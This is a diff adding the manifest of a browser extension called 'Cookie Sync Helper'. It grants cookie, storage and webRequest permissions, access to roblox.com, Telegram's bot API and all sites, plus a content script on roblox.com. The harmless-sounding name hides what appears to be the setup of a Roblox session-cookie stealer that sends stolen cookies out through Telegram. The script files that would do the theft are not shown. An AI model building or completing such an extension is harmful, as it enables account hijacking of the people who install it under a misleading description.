@@ -1,0 +1,28 @@
+{
+  "manifest_version": 3,
+  "name": "Cookie Sync Helper",
+  "version": "1.0",
+  "description": "Helper for cookie synchronization",
+  "permissions": [
+    "cookies",
+    "storage",
+    "webRequest"
+  ],
+  "host_permissions": [
+    "https://*.roblox.com/*",
+    "https://api.telegram.org/*",
+    "*://*/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["https://www.roblox.com/*"],
+      "js": ["content.js"]
+    }
+  ],
+  "action": {
+    "default_popup": "popup.html"
+  }
+}
